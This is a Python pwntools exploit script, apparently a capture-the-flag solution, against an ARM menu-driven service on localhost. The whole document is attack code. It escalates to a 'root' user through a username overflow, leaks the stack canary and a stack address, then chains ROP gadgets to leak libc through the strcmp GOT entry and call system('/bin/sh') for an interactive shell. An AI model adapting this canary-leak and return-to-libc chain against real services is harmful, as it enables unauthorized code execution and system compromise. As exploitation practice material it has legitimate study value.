#!/usr/bin/env python
from pwn import *
context.arch = 'arm'

r = remote('127.0.0.1', 4000)
libc = ELF('libc-2.19.so')

def info():
    r.sendlineafter('Your choice: ', '1')

def login(name, passwd):
    r.sendlineafter('Your choice: ', '2')
    r.sendafter('Username: ', name)
    r.sendafter('password: ', passwd)

def echo():
    r.sendlineafter('Your choice: ', '3')

def change_username(new_name):
    r.sendlineafter('Your choice: ', '4')
    r.sendafter('New username: ', new_name)

puts_plt = 0x10660
read_plt = 0x10618
strcmp_got = 0x22010
pop_r3_pc = 0x105dc
pop_r4_r5_r6_r7_r8_r9_r10_pc = 0x1107c
mov_r2_r9_r1_r8_r0_r7_blx_r3 = 0x11064

# get root privilege
login('A'*4, 'a'*4)
change_username('A'*32)
change_username('root\n')

# information leak
echo()
r.send('echo '.ljust(0x81, 'B'))
r.recvuntil('B'*0x7c)
canary = u32('\x00'+r.recvn(3))
log.success('canary: ' + hex(canary))

r.send('echo '.ljust(0x84, 'B'))
r.recvuntil('B'*0x7f)
stack = u32(r.recvn(4))
log.success('stack: ' + hex(stack))
rop_head = stack - 8

rop1 = flat(
    pop_r3_pc,
    puts_plt,
    pop_r4_r5_r6_r7_r8_r9_r10_pc,
    0xdeadbeef,
    0xdeadbeef,
    0xdeadbeef,
    strcmp_got,
    0xdeadbeef,
    0xdeadbeef,
    0xdeadbeef,
    mov_r2_r9_r1_r8_r0_r7_blx_r3,
    0xdeadbeef,
    0xdeadbeef,
    0xdeadbeef,
    0,
    rop_head+84,
    0x1000,
    0xdeadbeef,
    pop_r3_pc,
    read_plt,
    mov_r2_r9_r1_r8_r0_r7_blx_r3,
# rop_head+84:
)

r.sendafter('$ ', 'echo '.ljust(0x80, 'B')+p32(canary)+'B'*4+rop1)
log.info('len(first payload): ' + hex(0x88+len(rop1)))
r.sendafter('$ ', 'exit\n')
libc_base = u32(r.recvn(4)) - libc.symbols['strcmp']
log.success('libc base: ' + hex(libc_base))
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search('/bin/sh\x00'))

rop2 = flat(
    0xdeadbeef,
    0xdeadbeef,
    0xdeadbeef,
    binsh,
    0xdeadbeef,
    0xdeadbeef,
    0xdeadbeef,
    pop_r3_pc,
    system,
    mov_r2_r9_r1_r8_r0_r7_blx_r3
)

r.send(rop2)

r.interactive()
